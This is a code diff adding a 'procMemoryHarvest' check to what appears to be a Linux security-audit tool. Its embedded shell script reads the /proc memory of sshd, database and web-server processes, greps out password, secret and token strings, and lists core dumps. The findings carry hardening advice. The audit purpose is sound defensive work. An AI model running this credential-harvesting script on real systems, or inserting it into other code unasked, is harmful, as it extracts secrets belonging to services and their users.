@@ -581,3 +581,84 @@ done
 
   return { output: output.join("\n"), findings }
 }
+
+export async function procMemoryHarvest(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Process Memory Credential Harvest ==="]
+
+  const target = argVal(args, "--target")
+  const targets = target ? [target] : ["sshd", "nginx", "apache2", "httpd", "mysqld", "postgres", "redis-server", "vsftpd", "proftpd"]
+
+  const script = `
+echo "--- Checking ptrace_scope ---"
+cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo "unknown"
+
+echo ""
+echo "--- Target Process Memory Scan ---"
+TARGETS="${targets.join(" ")}"
+for procname in $TARGETS; do
+  pids=$(pgrep -x "$procname" 2>/dev/null || pgrep -f "$procname" 2>/dev/null)
+  for pid in $pids; do
+    if [ -r "/proc/$pid/mem" ] && [ -r "/proc/$pid/maps" ]; then
+      echo "[+] PID $pid ($procname) — memory readable"
+      grep -E "\\[heap\\]|\\[stack\\]" /proc/$pid/maps 2>/dev/null | head -5
+      strings /proc/$pid/mem 2>/dev/null | grep -iE "(password|passwd|pass=|pwd=|secret|token|auth)" 2>/dev/null | sort -u | head -20
+      echo ""
+    else
+      echo "[-] PID $pid ($procname) — memory not readable (ptrace_scope or permissions)"
+    fi
+  done
+done
+
+echo ""
+echo "--- Core Dumps ---"
+find /var/crash /var/core /tmp -name "core.*" -o -name "*.core" 2>/dev/null | head -10
+ls -la /var/crash/ 2>/dev/null
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  const readable = (r.stdout.match(/memory readable/g) || []).length
+  if (readable > 0) {
+    findings.push({
+      checkId: "LNX-PROC-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "FOUND",
+      resource: "process_memory",
+      title: "Process memory contains credentials",
+      details: `${readable} process(es) have readable memory — credential strings extracted from heap/stack`,
+      remediation: "Set kernel.yama.ptrace_scope=1 or higher. Restrict /proc access with hidepid=2.",
+    })
+  }
+
+  const ptraceScope = r.stdout.match(/^(\d)$/m)
+  if (ptraceScope && ptraceScope[1] === "0") {
+    findings.push({
+      checkId: "LNX-PROC-002",
+      provider: "linuxhook",
+      severity: "MEDIUM",
+      status: "FOUND",
+      resource: "/proc/sys/kernel/yama/ptrace_scope",
+      title: "YAMA ptrace_scope is disabled (0)",
+      details: "Any process can ptrace any other process owned by the same user — enables credential extraction from process memory",
+      remediation: "Set kernel.yama.ptrace_scope=1 in /etc/sysctl.conf",
+    })
+  }
+
+  if (r.stdout.includes("core.") || r.stdout.includes(".core")) {
+    findings.push({
+      checkId: "LNX-PROC-003",
+      provider: "linuxhook",
+      severity: "MEDIUM",
+      status: "FOUND",
+      resource: "core_dumps",
+      title: "Core dump files found",
+      details: "Core dumps may contain process memory with credentials, encryption keys, or sensitive data",
+      remediation: "Disable core dumps (ulimit -c 0, /etc/security/limits.conf). Remove existing core files.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
